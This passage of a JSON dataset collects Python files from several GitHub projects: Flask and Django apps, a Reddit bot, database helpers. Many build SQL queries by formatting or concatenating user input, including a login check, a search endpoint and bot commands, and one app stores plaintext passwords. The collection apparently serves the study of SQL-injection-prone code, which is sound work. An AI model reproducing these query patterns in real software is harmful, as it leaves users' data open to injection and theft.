))\n            self.db.commit ()\n        except:\n            import traceback\n            traceback.print_exc ()\n\n    def init_user_db (self,db_file):\n        if not path.exists (db_file):\n            db = sqlite3.connect (db_file)\n            db.execute('PRAGMA page_size = 4096;')\n            db.execute( 'PRAGMA cache_size = 20000;' )\n            db.execute( 'PRAGMA temp_store = MEMORY; ' )\n            db.execute( 'PRAGMA synchronous = OFF; ' )\n            db.commit()\n\n    def get_database_desc(self, db_file):\n        if not path.exists(db_file):\n            return None\n        try:\n            db = sqlite3.connect(db_file)\n            desc = {}\n            for row in db.execute(\"SELECT * FROM desc;\").fetchall():\n                desc[row[0]] = row[1]\n            return desc\n        except:\n            return None\n\n    def get_number_of_columns_of_phrase_table(self, db_file):\n        '''\n        Get the number of columns in the 'phrases' table in\n        the database in db_file.\n\n        Determines the number of columns by parsing this:\n\n        sqlite> select sql from sqlite_master where name='phrases';\nCREATE TABLE phrases (id INTEGER PRIMARY KEY AUTOINCREMENT,                mlen INTEGER, clen INTEGER, input_phrase TEXT, phrase TEXT, freq INTEGER, user_freq INTEGER)\n        sqlite>\n\n        This result could be on a single line, as above, or on multiple\n        lines.\n        '''\n        if not path.exists (db_file):\n            return 0\n        try:\n            db = sqlite3.connect (db_file)\n            tp_res = db.execute(\n                \"select sql from sqlite_master where name='phrases';\"\n            ).fetchall()\n            # Remove possible line breaks from the string where we\n            # want to match:\n            str = ' '.join(tp_res[0][0].splitlines())\n            res = re.match(r'.*\\((.*)\\)', str)\n            if res:\n                tp = res.group(1).split(',')\n                return len(tp)\n            else:\n                return 0\n        except:\n            return 0\n\n    def check_phrase(self, phrase, input_phrase=None, database='main'):\n        '''Check word freq and user_freq\n        '''\n        if type(phrase) != type(u''):\n            phrase = phrase.decode('utf8')\n        if type(input_phrase) != type(u''):\n            input_phrase = input_phrase.decode('utf8')\n\n        if len(phrase) < 4:\n            return\n\n        sqlstr = '''\n                SELECT * FROM user_db.phrases WHERE phrase = \"%(phrase)s\" and input_phrase = \"%(input_phrase)s\"\n                UNION ALL\n                SELECT * FROM mudb.phrases WHERE phrase = \"%(phrase)s\" and input_phrase = \"%(input_phrase)s\"\n                ORDER BY user_freq DESC, freq DESC, id ASC;''' %{'phrase': phrase, 'input_phrase': input_phrase}\n        result = self.db.execute(sqlstr).fetchall()\n        # If phrase is among the suggestions of self.hunspell_obj.suggest(input_phrase)\n        # append it to results:\n        filter(lambda x: x[-3] == phrase and result.append(tuple(x)),\n               self.hunspell_obj.suggest(input_phrase))\n        if len(result) == 0:\n            # The phrase was neither found in user_db nor mudb nor\n            # does hunspell_obj.suggest(input_phrase) suggest such\n            # a phrase. Therefore, it is a completely new, user\n            # defined phrase and we add it into mudb:\n            self.add_phrase((input_phrase,phrase,-2,1), database = 'mudb')\n\n        sysdb = {}\n        usrdb = {}\n        mudb = {}\n        map(lambda x: sysdb.update([(x[3:-2],x[:])]), filter(lambda x: not x[-1], result))\n        map(lambda x: usrdb.update([(x[3:-2], x[:])]), filter(lambda x: (x[-2] in [0,-1]) and x[-1], result))\n        map(lambda x: mudb.update([(x[3:-2], x[:])]), filter(lambda x: (x[-2] not in [0,-1]) and x[-1], result))\n\n        # we remove the keys already contained in mudb{} from usrdb{}\n        map(usrdb.pop, filter(lambda key: key in mudb, usrdb.keys()))\n        # we remove the keys already contained in mudb{} or usrdb{} from sysdb{}\n        map(sysdb.pop, filter(lambda key: key in mudb or key in usrdb, sysdb.keys()))\n\n        map(lambda res: self.add_phrase((res[0],phrase,(-3 if usrdb[res][-2] == -1 else 1),usrdb[res][-1]+1), database = 'mudb'), usrdb.keys())\n        map(lambda res: self.add_phrase((res[0],phrase,2,1), database = 'mudb'), sysdb.keys())\n\n        map(lambda key:\n            self.update_phrase((mudb[key][3], mudb[key][4], mudb[key][5], mudb[key][6]+1),\n                               database='mudb'),\n            mudb.keys())\n\n    def remove_phrase (self,phrase,database='user_db'):\n        '''\n        Remove phrase from database.\n        phrase should be a tuple like a row in the database, i.e.\n        like the result lines of a \"select * from phrases;\"\n        Like (id, mlen,clen,input_phrase,phrase,freq,user_freq)\n        '''\n        id, mlen, clen, input_phrase, phrase, freq, user_freq = phrase\n\n        delete_sqlstr = '''\n        DELETE FROM %(database)s.phrases\n        WHERE input_phrase = :input_phrase AND phrase = :phrase\n        ;''' %{'database': database}\n        delete_sqlargs = {'input_phrase': input_phrase, 'phrase': phrase}\n        self.db.execute(delete_sqlstr, delete_sqlargs)\n        self.db.commit()\n\n    def extract_user_phrases(self, udb, only_defined=False):\n        '''extract user phrases from database'''\n        try:\n            db = sqlite3.connect(udb)\n        except:\n            return None\n        if only_defined:\n            _phrases = db.execute(\\\n                    \"SELECT clen, phrase, freq, sum(user_freq)\\\n                    FROM phrases \\\n                    WHERE freq=-1 AND mlen != 0 \\\n                    GROUP BY clen,phrase;\").fetchall()\n        else:\n            _phrases = db.execute(\\\n                    \"SELECT clen, phrase, freq, sum(user_freq)\\\n                    FROM phrases\\\n                    WHERE mlen !=0 \\\n                    GROUP BY clen,phrase;\").fetchall()\n        db.commit()\n        return _phrases[:]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/wanduow/ampy/blob/0bfd4ad78a3bd4893c1823fa659d2d6381a67089",
        "file_path": "/ampy/netevmon.py",
        "source": "#!/usr/bin/env python\n\n\"\"\"\nConnects to the event database produced by netevmon and queries it for\nevents.\n\"\"\"\n\nimport datetime\nimport time\nimport urllib2\nimport sys\nimport ampy.result\n\nfrom sqlalchemy.sql import and_, or_, not_, text\nfrom sqlalchemy.sql.expression import select, outerjoin, func, label\nfrom sqlalchemy.engine.url import URL\nfrom sqlalchemy import create_engine, MetaData, Table\nfrom sqlalchemy.engine import reflection\n\ntry:\n    import pylibmc\n    _have_memcache = True\nexcept ImportError:\n    _have_memcache = False\n\nclass Connection(object):\n\n    def __reflect_db(self):\n        self.metadata = MetaData(self.engine)\n        try:\n            self.metadata.reflect(bind=self.engine)\n        except OperationalError, e:\n            print >> sys.stderr, \"Error binding to database %s\" % (dbname)\n            print >> sys.stderr, \"Are you sure you've specified the right database name?\"\n            sys.exit(1)\n\n        # reflect() is supposed to take a 'views' argument which will\n        # force it to reflects views as well as tables, but our version of\n        # sqlalchemy didn't like that. So fuck it, I'll just reflect the\n        # views manually\n        views = self.inspector.get_view_names()\n        for v in views:\n            view_table = Table(v, self.metadata, autoload=True)\n\n\n    def __init__(self, host=None, name=\"events\", pwd=None, user=None):\n        cstring = URL('postgresql', password=pwd, \\\n                host=host, database=name, username=user)\n\n        self.engine = create_engine(cstring, echo=False)\n        self.inspector = reflection.Inspector.from_engine(self.engine)\n        self.__reflect_db()\n\n        self.conn = self.engine.connect()\n\n    def __del__(self):\n        self.conn.close()\n\n    def get_stream_events(self, stream_ids, start=None, end=None):\n        \"\"\"Fetches all events for a given stream between a start and end\n           time. Events are returned as a Result object.\"\"\"\n        # Honestly, start and end should really be set by the caller\n        if end is None:\n            end = int(time.time())\n\n        if start is None:\n            start = end - (12 * 60 * 60)\n\n        evtable = self.metadata.tables['event_view']\n\n        # iterate over all stream_ids and fetch all events\n        stream_str = \"(\"\n        index = 0\n        for stream_id in stream_ids:\n            stream_str += \"%s = %s\" % (evtable.c.stream_id, stream_id)\n            index += 1\n            # Don't put OR after the last stream!\n            if index != len(stream_ids):\n                stream_str += \" OR \"\n        stream_str += \")\"\n\n        wherecl = \"(%s >= %u AND %s <= %u AND %s)\" % ( \\\n                evtable.c.timestamp, start, evtable.c.timestamp, \\\n                end, stream_str)\n\n        query = evtable.select().where(wherecl).order_by(evtable.c.timestamp)\n        return self.__execute_query(query)\n\n    def __execute_query(self, query):\n\n        res = query.execute()\n\n        event_list = []\n\n        for row in res:\n            foo = {}\n            for k,v in row.items():\n                foo[k] = v\n            event_list.append(foo)\n        res.close()\n\n        return ampy.result.Result(event_list)\n\n    def get_events_in_group(self, group_id):\n        \"\"\"Fetches all of the events belonging to a specific event group.\n           The events are returned as a Result object.\"\"\"\n        evtable = self.metadata.tables['full_event_group_view']\n\n        wherecl = \"(%s = %u)\" % (evtable.c.group_id, group_id)\n\n        query = evtable.select().where(wherecl).order_by(evtable.c.timestamp)\n        return self.__execute_query(query)\n\n    def get_event_groups(self, start=None, end=None):\n        \"\"\"Fetches all of the event groups between a start and end time.\n           The groups are returned as a Result object.\"\"\"\n        if end is None:\n            end = int(time.time())\n\n        if start is None:\n            start = 0\n\n        start_dt = datetime.datetime.fromtimestamp(start)\n        end_dt = datetime.datetime.fromtimestamp(end)\n\n        grptable = self.metadata.tables['event_group']\n\n        wherecl = and_(grptable.c.group_start_time >= start_dt, \\\n                grptable.c.group_end_time <= end_dt)\n\n        query = grptable.select().where(wherecl).order_by(grptable.c.group_start_time)\n        return self.__execute_query(query)\n\n\n# vim: set smartindent shiftwidth=4 tabstop=4 softtabstop=4 expandtab :\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/wanduow/ampy/blob/0bfd4ad78a3bd4893c1823fa659d2d6381a67089",
        "file_path": "/setup.py",
        "source": "try:\n    from setuptools.core import setup\nexcept ImportError:\n    from distutils.core import setup\n\nrequires = [\n    'sqlalchemy'\n    ]\n\nsetup(\n    name='ampy',\n    description='Python library for interacting with AMP data.',\n    packages=['ampy'],\n    install_requires=requires,\n    version='0.0',\n    author='',\n    author_email='',\n    url='',\n    long_description=open('README.txt').read(),\n)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/shashvatshukla/visualising-political-shills/blob/68097c0a5a928d1fca7b4768458097b94c94f43a",
        "file_path": "/metrics/Network/network_metrics.py",
        "source": "import psycopg2\nimport consts\nfrom metrics.Network.partition import partition_bots, partition_groups\nfrom sentiment_analysis import sentiment_compound_score\n\nconnection = psycopg2.connect(**consts.db_creds)\n\n\ndef get_edges(users):\n    user_dict = {}\n    for i in users:\n        user_dict[i] = 1\n    cursor = connection.cursor()\n    drop_old = \"DELETE FROM temp\"\n    connection.commit()\n    try:\n        cursor.execute(drop_old)\n    except psycopg2.ProgrammingError:\n        pass\n    insert = \"\"\"INSERT INTO temp (usr)\n                 VALUES (%s);\"\"\"\n    for user in user_dict:\n        cursor.execute(insert, [user])\n    connection.commit()\n    select = \"\"\" SELECT influences.usr, influences.other_usr\n                 FROM influences\n                 INNER JOIN temp as t1\n                 ON t1.usr = influences.usr AND influences.usr != influences.other_usr\n                 INNER JOIN temp as t2\n                 ON t2.usr = influences.other_usr\"\"\"\n    cursor.execute(select)\n    edges = []\n    fetched = [None]\n    while len(fetched) > 0:\n        fetched = cursor.fetchall()\n        edges.extend(fetched)\n    cursor.execute(drop_old)\n    connection.commit()\n    return edges\n\n\ndef get_tweets(keywords):\n    select_tweets = \"\"\"SELECT interactions.usr, interactions.other_usr, tweets.text\n                       FROM interactions\n                       INNER JOIN tweets\n                       ON tweets.twid = interactions.twid\n                       WHERE tweets.text LIKE '%{}%' \"\"\" + \"AND tweets.text LIKE '%{}%' \" * (len(keywords) - 1)\n    select_tweets = select_tweets.format(*keywords)\n    cursor = connection.cursor()\n    cursor.execute(select_tweets)\n    fetched = [None]\n    output = []\n    while len(fetched) > 0:\n        fetched = cursor.fetchall()\n        output.extend(fetched)\n    return output\n\n\ndef get_sentiment(groups, tweets):\n    groups_dict = {}\n    for i, group in enumerate(groups):\n        for user in group:\n            groups_dict[user] = i\n    total_sentiment = [[0 for _ in range(len(groups))] for _ in range(len(groups))]\n    for tweet in tweets:\n        if tweet[0] in groups_dict and tweet[1] in groups_dict:\n            total_sentiment[groups_dict[tweet[0]]][groups_dict[tweet[1]]] += sentiment_compound_score(tweet[2])\n    return total_sentiment\n\n\ndef sub_network(keywords):\n    tweets = get_tweets(keywords)\n    users = set()\n    for i, j, _ in tweets:\n        users.add(i)\n        users.add(j)\n    users = list(users)\n    group1, group2 = partition_groups(users)\n    partition = {}\n    for i in group1:\n        partition[i] = 0\n    for i in group2:\n        partition[i] = 1\n    group1h, group1b = partition_bots(group1)\n    group2h, group2b = partition_bots(group2)\n    for i in tweets:\n        if i[0] in group1h and i[1] in group2h:\n            print(i[2])\n            break\n    sentiment = get_sentiment((group1h, group1b, group2h, group2b), tweets)\n    return group1h, group1b, group2h, group2b, sentiment\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/spencerneveux/Maeve-s-Escape/blob/70ca3f7c8851975910855dffa54d9a4010975485",
        "file_path": "/app.py",
        "source": "from flask import Flask, render_template, url_for, flash, redirect, request\nfrom flask_sqlalchemy import SQLAlchemy \n\napp = Flask(__name__, static_folder='static', static_url_path='')\napp.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///site.sqlite3'\napp.config['SECRET_KEY'] = \"random string\"\ndb = SQLAlchemy(app)\n\nclass User(db.Model):\n\tid = db.Column(db.Integer, primary_key=True)\n\temail = db.Column(db.String(50))\n\tpassword = db.Column(db.String(20))\n\n\tdef __init__(self, email, password):\n\t\tself.email = email\n\t\tself.password = password\n\n@app.route('/')\ndef home():\n\treturn render_template('home.html')\n\n@app.route('/tables')\ndef tables():\n\treturn render_template('tables.html', User=User.query.all())\n\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n\tif request.method == 'POST':\n\t\tuser = User(request.form['email'], request.form['password'])\n\t\tdb.session.add(user)\n\t\tdb.session.commit()\n\t\treturn redirect(url_for('tables'))\n\treturn render_template('login.html')\n\n# Drop/Create all Tables\ndb.drop_all()\ndb.create_all()\n\nif __name__ == '__main__':\n\tapp.run(debug = True)\n\t",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ChemiKyle/Waterspots/blob/ec049281195138f817f9614ee49f621aac97b924",
        "file_path": "/app.py",
        "source": "\n__author__      = \"Kyle Chesney\"\n\nfrom flask import *\nfrom flask_login import LoginManager\n# TODO: Research SQLAlchemy vs raw SQL\n#from flask_sqlalchemy import SQLAlchemy\n# TODO: MariaDB vs PostgreSQL, re: audit trail\nimport sqlite3\nfrom datetime import datetime as dt\n\napp = Flask(__name__)\nlogin = LoginManager(app)\n#db = SQLAlchemy()\n\n@app.route('/')\ndef home():\n#    if current_user.is_authenticated:\n    return render_template('login.html')\n#    if not session.get('logged_in'):\n#        return render_template('login.html')\n\n\n# TODO: separate POST requests to allow entry of params after logging in\n@app.route('/', methods=['POST'])\ndef login():\n    print('login')\n    user = str(request.form['username'])\n    password = str(request.form['password'])\n    cur.execute('SELECT * FROM users WHERE name = \\'{}\\' AND password = \\'{}\\';'.format(user, password))\n    response = cur.fetchone()\n    if response != None:\n        print(response, 'OK')\n        return redirect(url_for('enter_test_point'))\n    else:\n        print(response, 'not OK')\n        flash('Invalid login or password')\n        return render_template('login.html')\n\n@app.route('/entry_type')\ndef enter_log():\n    # conn = sqlite3.connect\n    methods = ['Metals', 'Organics']\n    return render_template('entry.html', methods = methods)\n\n#@app.route('/entry', methods=['POST', 'GET'])\n#def render_entry():\n#    print('only here')\n#    return render_template('make_entry.html')\n\n@app.route('/entry', methods=['POST', 'GET'])\ndef enter_test_point():\n    if request.method == 'POST':\n        dict = {}\n        dict['study'] = 'test'\n        dict['timestamp'] = dt.now()\n        print(request.form)\n        for item, val in request.form.items():\n            dict[item] =  val\n        print(dict)\n        sql = \"\"\"INSERT INTO observations (study, pH, TDS, Turbidity, Temperature, timestamp)\n        VALUES(?,?,?,?,?,?)\"\"\"\n        cur.execute(sql, tuple(dict[k] for k in dict.keys()))\n        db.commit()\n    return render_template('make_entry.html', parameters = ['pH', 'TDS', 'Turbidity', 'Temperature'])\n\n\nif __name__ == \"__main__\":\n    app.secret_key = 'bottom text'\n    db = sqlite3.connect('db/test.db', check_same_thread=False)\n    cur = db.cursor()\n    app.run(debug=True, host = '0.0.0.0')\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/codethechange/culturemesh-api/blob/67752de000e27bb109ddd532b2b545451fabeee6",
        "file_path": "/api/blueprints/locations/controllers.py",
        "source": "from flask import Blueprint, request\nfrom api import require_apikey\nfrom api.apiutils import *\n\nlocations = Blueprint('location', __name__)\n\n\n@locations.route(\"/ping\")\n@require_apikey\ndef test():\n    return \"pong\"\n\n\n@locations.route(\"/countries/<country_id>\", methods=[\"GET\"])\n@require_apikey\ndef get_country(country_id):\n    return get_by_id(\"countries\", country_id)\n\n\n@locations.route(\"/regions/<region_id>\", methods=[\"GET\"])\n@require_apikey\ndef get_region(region_id):\n    return get_by_id(\"regions\", region_id)\n\n\n@locations.route(\"/cities/<city_id>\", methods=[\"GET\"])\n@require_apikey\ndef get_city(city_id):\n    return get_by_id(\"cities\", city_id)\n\n\n@locations.route(\"/autocomplete\", methods=[\"GET\"])\n@require_apikey\ndef autocomplete():\n    # TODO: Have fancier queries. For now, we will just take advantage of regex, which functions as a \"contains\"\n    # TODO: Since we can't let pymysql put quotes for us (we need the %'s in between to have regex), we have to do\n    # a direct format. This is a SQL injection vulnerability.\n    # First, get relevant cities.\n\n    conn = mysql.get_db()\n    location_objects = []\n    city_cur = conn.cursor()\n    city_cur.execute(\"SELECT cities.name, id AS city_id, region_id, country_id FROM cities WHERE cities.name REGEXP %s LIMIT 100\"\n                     , (request.args[\"input_text\"],))\n    location_objects.extend(convert_objects(city_cur.fetchall(), city_cur.description))\n    if len(location_objects) == 100:  # If we already have 100 results, which is plenty, let's just return those.\n        return make_response(jsonify(location_objects), HTTPStatus.OK)\n    region_cur = conn.cursor()\n    region_cur.execute(\"SELECT regions.name, 'null' AS city_id, id AS region_id, country_id FROM regions WHERE regions.name REGEXP %s LIMIT 100\"\n                       , (request.args[\"input_text\"],))\n    location_objects.extend(convert_objects(region_cur.fetchall(), region_cur.description))\n    if len(location_objects) == 100:\n        return make_response(jsonify(location_objects), HTTPStatus.OK)\n    country_cur = conn.cursor()\n    country_cur.execute(\"SELECT countries.name, 'null' AS city_id, 'null' AS region_id, id AS country_id FROM countries WHERE countries.name REGEXP %s LIMIT 100\"\n                        , (request.args[\"input_text\"],))\n    location_objects.extend(convert_objects(country_cur.fetchall(), country_cur.description))\n    return make_response(jsonify(location_objects), HTTPStatus.OK)\n\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/brigada-mx/backend/blob/a2a39b7fb197b9ebf1e87d98d688e3ce94e2050e",
        "file_path": "/src/api/views/map.py",
        "source": "from django.db.models import Prefetch, Q\nfrom django.shortcuts import get_object_or_404\n\nfrom rest_framework import generics\n\nfrom db.map.models import State, Municipality, Locality, Action, Organization, Establishment, Submission\nfrom api.serializers import StateSerializer, MunicipalitySerializer\nfrom api.serializers import LocalityDetailSerializer, LocalityRawSerializer, LocalitySearchSerializer\nfrom api.serializers import EstablishmentSerializer, SubmissionSerializer\nfrom api.serializers import ActionSubmissionsSerializer, ActionLogSerializer, ActionDetailSerializer\nfrom api.serializers import OrganizationSerializer, OrganizationDetailSerializer\nfrom api.paginators import LargeNoCountPagination\nfrom api.throttles import SearchBurstRateScopedThrottle\nfrom api.filters import ActionFilter, EstablishmentFilter, SubmissionFilter\n\n\nclass StateList(generics.ListAPIView):\n    serializer_class = StateSerializer\n\n    def get_queryset(self):\n        return self.get_serializer_class().setup_eager_loading(\n            State.objects.all()\n        )\n\n\nclass MunicipalityList(generics.ListAPIView):\n    serializer_class = MunicipalitySerializer\n\n    def get_queryset(self):\n        return self.get_serializer_class().setup_eager_loading(\n            Municipality.objects.all()\n        )\n\n\nlocality_list_raw_query = \"\"\"\nSELECT\n    map_locality.*,\n    (SELECT\n        COUNT(*)\n        FROM map_action\n        WHERE map_action.locality_id = map_locality.id AND map_action.published = true\n    ) AS action_count\nFROM map_locality\nWHERE map_locality.has_data = true\"\"\"\n\n\nclass LocalityList(generics.ListAPIView):\n    serializer_class = LocalityRawSerializer\n    pagination_class = LargeNoCountPagination\n\n    def get_queryset(self):\n        return Locality.objects.raw(locality_list_raw_query)\n\n\nclass LocalityDetail(generics.RetrieveAPIView):\n    serializer_class = LocalityDetailSerializer\n\n    def get_queryset(self):\n        return self.get_serializer_class().setup_eager_loading(\n            Locality.objects.all().order_by('-modified')\n        )\n\n\nclass EstablishmentList(generics.ListAPIView):\n    serializer_class = EstablishmentSerializer\n    filter_class = EstablishmentFilter\n\n    def get_queryset(self):\n        return self.get_serializer_class().setup_eager_loading(\n            Establishment.objects.all()\n        )\n\n\nclass ActionList(generics.ListAPIView):\n    serializer_class = ActionSubmissionsSerializer\n    filter_class = ActionFilter\n\n    def get_queryset(self):\n        return self.get_serializer_class().setup_eager_loading(\n            Action.objects.filter(published=True)\n        )\n\n\nclass ActionDetail(generics.RetrieveAPIView):\n    serializer_class = ActionDetailSerializer\n\n    def get_queryset(self):\n        return self.get_serializer_class().setup_eager_loading(\n            Action.objects.filter(published=True)\n        )\n\n\nclass ActionLogList(generics.ListAPIView):\n    serializer_class = ActionLogSerializer\n\n    def get_queryset(self):\n        action = get_object_or_404(Action, pk=self.kwargs['pk'], published=True)\n        return self.get_serializer_class().setup_eager_loading(\n            action.actionlog_set.all().order_by('-modified')\n        )\n\n\nclass OrganizationList(generics.ListAPIView):\n    serializer_class = OrganizationSerializer\n\n    def get_queryset(self):\n        return self.get_serializer_class().setup_eager_loading(\n            Organization.objects.all().order_by('-modified')\n        )\n\n\nclass OrganizationDetail(generics.RetrieveAPIView):\n    serializer_class = OrganizationDetailSerializer\n\n    def get_queryset(self):\n        return self.get_serializer_class().setup_eager_loading(\n            Organization.objects.all().order_by('-modified')\n        )\n\n\nclass SubmissionList(generics.ListAPIView):\n    serializer_class = SubmissionSerializer\n    filter_class = SubmissionFilter\n\n    def get_queryset(self):\n        return self.get_serializer_class().setup_eager_loading(\n            Submission.objects.filter(Q(action__isnull=True) | Q(action__published=True), published=True)\n        )\n\n\nlocality_list_search_query = \"\"\"\nSELECT id, cvegeo, location, name, municipality_name, state_name\nFROM locality_search_index\nWHERE document @@ to_tsquery('spanish', '{tokens}')\nORDER BY ts_rank(document, to_tsquery('spanish', '{tokens}')) DESC\nLIMIT 30\"\"\"\n\n\nclass LocalitySearch(generics.ListAPIView):\n    search_burst_throttle_scope = 'search_burst'\n    throttle_classes = (SearchBurstRateScopedThrottle,)\n\n    serializer_class = LocalitySearchSerializer\n\n    def get_queryset(self):\n        search = self.request.query_params.get('search', '')\n        tokens = ' & '.join(search.split())\n        return Locality.objects.raw(locality_list_search_query.format(tokens=tokens))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/LiquidFun/Reddit-GeoGuessr-Tracking-Bot/blob/5559fa5c1a56ac602b34d8b8fbccea7f4c133770",
        "file_path": "/AddScoresToDatabase.py",
        "source": "import praw\nimport re\nfrom datetime import datetime\nimport operator\n\nimport sqlite3\n\ndef getDate(submission):\n    time = datetime.fromtimestamp(submission.created)\n    # return datetime.date.fromtimestamp(time)\n    return time.strftime('%Y-%m-%d %H:%M:%S')\n\ndef getTitle(submission):\n    delimChars = ['-', ':', '=', '#', '(', ')']\n\n    title = str(submission.title)\n\n    # Get first part of title by spliting before line or colon\n    for delimChar in delimChars:\n        title = title.split(delimChar)[0]\n\n    # Join the resulting chars\n    return str(''.join(re.findall('[a-zA-Z]', title)).lower())\n\ndef addToDatabase(submissionList):\n\n    # Measure time\n    startTime = datetime.now()\n\n    database = sqlite3.connect('database.db')\n    cursor = database.cursor()\n\n    #reddit = getRedditInstance()\n\n    botUsername = getBotUsername()\n\n    # Get top level comments from submissions and get their first numbers with regex\n    for submission in reversed(list(submissionList)):\n        scoresInChallenge = [[-1, ''], [-2, ''], [-3, ''], [-4, '']] \n        for topLevelComment in submission.comments:\n\n            # Looks for !TrackThisSeries and !StopTracking posts and replies to them\n            try:\n                if topLevelComment.author.name == submission.author.name:\n                    alreadyReplied = False\n                    if '!trackthisseries' in topLevelComment.body.lower():\n                        print(\"Found track request: \" + str(submission.id))\n                        # Write new entries to the local database\n                        cursor.execute(\"INSERT OR REPLACE INTO SeriesTracking VALUES ('\" + getTitle(submission) + \"', '\" + getDate(submission) + \"')\")\n                        \n                        for reply in topLevelComment.replies:\n                            if reply.author.name == botUsername:\n                                alreadyReplied = True\n                                #cursor.execute(\"INSERT OR REPLACE INTO TrackingRequests VALUES ('\" + str(topLevelComment.fullname) + \"')\")\n\n                        #if cursor.execute(\"SELECT COUNT(*) FROM TrackingRequests WHERE CommentID = '\" + str(topLevelComment.fullname) + \"'\").fetchone()[0] == 0:\n                        if not alreadyReplied:\n                            replyToTrackRequest(topLevelComment, True)\n                    if '!stoptracking' in topLevelComment.body.lower():\n                        print(\"Found stop tracking request: \" + str(submission.id))\n                        # Delete old entries in the database\n                        cursor.execute(\"DELETE FROM SeriesTracking WHERE SeriesTitle = '\" + getTitle(submission) + \"'\")\n                        \n                        for reply in topLevelComment.replies:\n                            if reply.author.name == botUsername:\n                                alreadyReplied = True\n                                #cursor.execute(\"INSERT OR REPLACE INTO TrackingRequests VALUES ('\" + str(topLevelComment.fullname) + \"')\")\n\n                        #if cursor.execute(\"SELECT COUNT(*) FROM TrackingRequests WHERE CommentID = '\" + str(topLevelComment.fullname) + \"'\").fetchone()[0] == 0:\n                        if not alreadyReplied:\n                            replyToTrackRequest(topLevelComment, False)\n            except AttributeError:\n                pass\n\n            # Avoid comments which do not post their own score; Get the highest number in each comment and add it to the list with the user's username\n            if 'Previous win:' not in topLevelComment.body and 'for winning' not in topLevelComment.body and 'for tying' not in topLevelComment.body and '|' not in topLevelComment.body and topLevelComment is not None and topLevelComment.author is not None:\n                try:\n                    number = max([int(number.replace(',', '')) for number in re.findall('(?<!round )(?<!~~)(?<!\\w)\\d+\\,?\\d+', topLevelComment.body)])\n                except (IndexError, ValueError) as e:\n                    number = -1\n                    break\n                if 0 <= number <= 32395:\n                    scoresInChallenge.append([int(number), topLevelComment.author.name])\n        scoresInChallenge.sort(key = operator.itemgetter(0), reverse = True)\n\n        # If two players have the same score add the second one to the authors of the first challenge with a pipe character inbetween\n        for i in range(0, 3):\n            while scoresInChallenge[i][0] == scoresInChallenge[i + 1][0]:\n                scoresInChallenge[i][1] += \"|\" + scoresInChallenge[i + 1][1]\n                del scoresInChallenge[i + 1]\n        #print(index)\n        #print(getTitle(submission.title))\n        #print(submission.id)\n        #print(scoresInChallenge[0][1])\n        #print(scoresInChallenge[1][1])\n        #print(scoresInChallenge[2][1])\n        #print(submission.created)\n\n        # Write new entries to the local database\n        record = (str(submission.id), getTitle(submission), str(scoresInChallenge[0][1]), str(scoresInChallenge[1][1]), str(scoresInChallenge[2][1]), getDate(submission))\n        cursor.execute(\"INSERT OR REPLACE INTO ChallengeRankings VALUES (?, ?, ?, ?, ?, ?)\", record)\n\n        #if cursor.execute(\"SELECT COUNT(*) FROM ChallengeRankings WHERE SubmissionID = '\" + submission.id + \"'\").fetchone()[0] == 0:\n        #    cursor.execute(\"INSERT INTO ChallengeRankings VALUES (?, ?, ?, ?, ?, ?)\", record)\n        # Update existing entries in the local database\n        #else:\n        #    cursor.execute(\"UPDATE ChallengeRankings SET Place1 = '\" + str(scoresInChallenge[0][1]) + \"', Place2 = '\" + str(scoresInChallenge[1][1]) + \"', Place3 = '\" + str(scoresInChallenge[2][1]) + \"' WHERE SubmissionID = '\" + str(submission.id) + \"'\")\n\n    database.commit()\n    database.close()\n\n# Reply to the comment which asks the bot to track the series\ndef replyToTrackRequest(comment, positive):\n    if positive == True:\n        print(\"I will be tracking this series: \" + getTitle(comment.submission.title) + \" because of this comment \" + comment.fullname)\n        #comment.reply(\"I will be tracking this series from now on.\")\n    else:\n        print(\"I will stop tracking this series: \" + getTitle(comment.submission.title) + \" because of this comment \" + comment.fullname)\n        #comment.reply(\"I will stop tracking this series from now on.\")\n\ndef getBotUsername():\n    inputFile = open(\"RedditAPIAccess.txt\")\n    lines = []\n    for line in inputFile:\n        lines.append(line)\n    return line[2]",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/LiquidFun/Reddit-GeoGuessr-Tracking-Bot/blob/5559fa5c1a56ac602b34d8b8fbccea7f4c133770",
        "file_path": "/CheckAndPostForSeriesSubmissions.py",
        "source": "import praw\nimport re\nfrom datetime import datetime\nfrom CreateAndUploadPlots import createAndUploadPlots\nfrom CreateTableFromDatabase import getRankingsFromDatabase\nfrom AddScoresToDatabase import getTitle\nfrom AddScoresToDatabase import getDate\nfrom AddScoresToDatabase import addToDatabase\nfrom AddScoresToDatabase import getBotUsername\nfrom InitDatabase import getRedditInstance\n#import datetime\nimport operator\n\nimport sqlite3\n\n\n\n# Checks about 100 new submissions, adds them to the local database, renews track requests\ndef checkNewSubmissions():\n\n    # Measure time\n    startTime = datetime.now()\n\n    #cursor.execute(\"INSERT OR REPLACE INTO SeriesTracking VALUES (SeriesTitle = 'redditgeoguessrcommunitychallenge', StartDate = '2017-07-10 01:00:00')\")\n    #database = sqlite3.connect('database.db')\n    #cursor = database.cursor()\n    #for val in cursor.execute(\"SELECT * FROM SeriesTracking\"):\n    #    print(val)\n    #database.close()\n\n    #cursor.commit()\n\n    reddit = getRedditInstance()\n    subreddit = reddit.subreddit(\"geoguessr\")\n\n    submissionList = subreddit.new(limit = 10)\n\n    addToDatabase(submissionList)\n\n    checkForSeriesSubmissions(submissionList)\n            \n    # Print how long it took\n    print(datetime.now() - startTime)\n\n# Check the submissionList for submissions for posts whose series is on the tracking list\ndef checkForSeriesSubmissions(submissionList):\n    database = sqlite3.connect('database.db')\n    cursor = database.cursor()\n\n    botUsername = getBotUsername()\n\n    for submission in submissionList:\n        if cursor.execute(\"SELECT COUNT(*) FROM SeriesTracking WHERE SeriesTitle = '\" + str(getTitle(submission)) + \"'\").fetchone()[0] != 0:\n            alreadyPosted = False\n            for reply in submission.comments:\n                try:\n                    if reply.author.name == botUsername:\n                        alreadyPosted = 